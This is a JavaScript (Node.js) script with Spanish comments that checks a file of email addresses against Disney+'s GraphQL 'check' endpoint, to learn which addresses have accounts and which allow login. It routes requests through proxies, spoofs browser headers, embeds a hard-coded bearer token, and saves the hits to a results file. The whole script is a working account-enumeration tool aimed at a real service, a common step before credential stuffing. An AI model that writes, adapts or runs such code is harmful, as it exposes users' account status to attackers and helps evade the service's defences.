import fs from "fs";
import { HttpsProxyAgent } from "https-proxy-agent";


// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails2.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..UjNEFGdlrvXEvL4m.8GEe-3dvGlNsbUxfsR9kIEWRHvubNinRFHw738q-7yDMdPMF3a3NY1gdTBufsz__xoMpNehDT2NU8KQhw_feN_MBfLcTPlvc1SaVPWj-csIu0IsmDZVsk4H_i0rNlgBo37d_iQ-HIXNSLvOw5k8aw9-w-lNFMnD-i9Kt-_2Sq5DiMjN-WW9okPUjVZwAPfe2MGWJXXdLIkFcN0ewXNfjaBxV8S9GawU6f3-fyqnesxVXdassOZB6uX4HtC9zGa0EU0sGwok8oXYaDDE2sghGLL2ZeVcunnHTvsViWqoajXa3CWSyC8a6XFyvJ1sZ7aktAQMum6rAA2w9eH-k7OHBu1iafl0uRBRQkbBOxAHMwbXtUSOuMLgzfjka_NyC-3XY0BNlyQgYGSPa7RRcgAgw9o1-vGS7fRkp2EFZB06G9IXANRcx5lsJ5YEZXaQOvAfq6FF1MVHNYWZTtYiwbay3Kx2Gm4HZxy4JBCK8XrY2ZJ8J2rNZj0JJ5jVmwgairb3J7HjXQ7UdYg6_AqEnylS6BR6T0EBNzcMoh6Oxnk0WbQ0wn7WLFiZU4Yo2q0w3HQJkmgDd_maCUxueVDcE8HonO38Xg1w3E5C3JSJAwa_kXrv6Morgt8L7wdNNgDWx0HQvHRX4GUsNjBf7S4FRA6Tilk1yOqMAe_7w-WFmJiHCmdlWwMRKnx-tO2LxS6IN2lk9D9RwEqnU6MZYJGYDsHjRyX84vWAtGueGZphgENOTuTtfWa8GKWxGc8YcCLACr5rjccj4E8XVr-aE-qLArooKdnGdSS65Wa5rrWQt2aBnduW4Atg3AX9KxTacmBviM-p6Ay3PjO5oYUc_R35fAB6ma2w5ZpSeTzERlAuRdp_d1EmNCVBhCTPmo6BJ8e8bbLB5aWCpgrBCzqQxbB5NgPsEBvVrj8TcJFS782AbnkD2kAnMKOzX3Be3zasgKE64sY2yG8XedmzmshGJRQizY30d5uFRERcXmmLiI0TBmxAJCKAK4uDtLt3m7__8dcPu0_h7sVGsw_Kjul_1VDgz-CMmfmEL6WcEvV-gC2yOuAyjE6tMzwBVbIIgcXmTlYp85wEvy3ndm33gz8nHT1r0x2lxe_b2k__hNr2Ej4tv_2CDCTxoIW_P3RqPKpUXa3Px4H7FIN4dOByYYDo0t2g8PFzKwmYDRWD2lNjSv4ILDDGqZcA3fRVTg_a1OOxUu4BH-BlO2Ge95lDFHrrqJ2s8cLWnSn4RtO4IR87DCM80LAT5WCiOft4g6IxIDwI_1id8CvjlmhzjvKrt1N9x-Z6YVcW94iF3d1P8OR_oD-joeE_fIodX5VkFiv8yR903n5YeJ9O2DUdzcgabaa6ZmiYsx1v1DQTl6Qum7YPGRdbjxgYU7GrP_Wl1DXcHPNnWPa8tn9qvtNKIxBaoGnukUVyYJBUf8zlenV3wPLm5_PG-aZ-zczL5Y8KZT7zXK_noQXdZ_gtScU3PNg-VbRzs6WhI9-90aqjZulFZ9E2uRChDgaFGk-rBA0B8brSVoGW-Qo-__4mYQ5CIFUcF_sHvyZxvpjKL_9gxA2QjWGU1s562-k0Wi-5WNCVc73yzhUWwC0BqTyUzyCowTx1UMRfY_ocbTcoiUikHs5RiaCiVyu7pXOn8MQIXvD3A3xlA16LRikVY6r-b-7k4eMc3RAngRNv_ZBUckZWoXFHAXUxjxTsVpnygtqFe-uju6Pme9yrZs6Mhodu91T1w8Zs5Z6Qy9yjQPf1-_GU_3GLiErBirlWhqFRNJu22SiIVsSevjXCg9-OI6TN0oaYXZyedN3cBqvCGbwn0HKiv57T4UzZ9TXlYYtqh8HZ56TByK0OQvzBt5TcsOqzlkZgU7HvEcbwGUv3jSLaKANurOq057grpxd0OkCRqKizwdPDKdQqKwrFViB9gwKUXGe-BSmFq6W6I3F7_EKhnw8DTdhorY031YoEEZaOcbjYrXnwVRqqTw8Ar8nig97WJaJ-W1UkxcM1x1vwRDp88UNbNV-CeJ7K0o2xIGgoQ_6mmPtPtKeLYlrmmgjHEWkrY7YAheYiubylzD2HogekqhXfIK78g444mohTh6yTeunVnE6gzCeu5SKYR_kVXygC4oVko3JL5Q_Kh8q7CiGZUtd1l9bz2IfSDNz5OncgM7CVKKipAcr53moEz5MwnxR4WZpTl_IEvaz0wonRR5TbjfDaB7aPaQWitgYOmou0tGkP_u5rz1n2Eq5LBejhfHXmY4mNXx6gDGHec9qWc4et_pmG1KFk5ADJsojHTql3OQAU9dXkyXJvKmQa-AcaIZtZbu_JJYap-sDRBUTfgmWvHxOqhrlftnBvAw7PHyk06ggqjwLg_HXST209BMBqYdrpjwCasnSczLZoNCMnQ3vh2pDE3BIk59A2gCRlepwR9ve-Gc6Djd18enafsn025oI7sOdDreSs801i4DBdRQHySl2yZTrM_awUoHZl8MxU3MBpEfEJqjmyfefTC36-36hDvII0Z8g2hB3AaezhGIQ08eTXZsoklLJip5jbIeCD05xEkzIVApWGiKEjIDW5hSW9csoLsgsCxehJVUe2i6N1ZeZ_G4iJ3c75G8xPOA4GRITnnvP3qgja14A2UpQ_bWSbbk9m35U4TCJdfCoi-2ybXSwRJBqs4uZLE49o4XL60GGDsM6fcP6xeVrWqGIfE3vXXvjw5.mz65HyzTm8bqvfU-SgVIyA"


const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
/* for (let i = 532; i >= 0; i--) { */
for (let i = 0; i < emailsALeer.length ; i++) {
    const correoFormado = emailsALeer[i];
    //console.log(correoFormado)
    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    /* const proxy = "http://8.35.211.163:80";
    const agent = new HttpsProxyAgent(proxy);

    const res = await fetch("https://ipinfo.io/json", {
        agent,
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    console.log(await res.json());

    break */

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if (result.exist === false) {
            console.log((i + 1) + " no existe")
        }
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }

    try {

        const proxy = "http://192.168.148.68:46704";
        const agent = new HttpsProxyAgent(proxy);

        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            agent,
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")) {
                            result.login = true
                            console.log("LOGIN")
                        } else {
                            result.login = false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}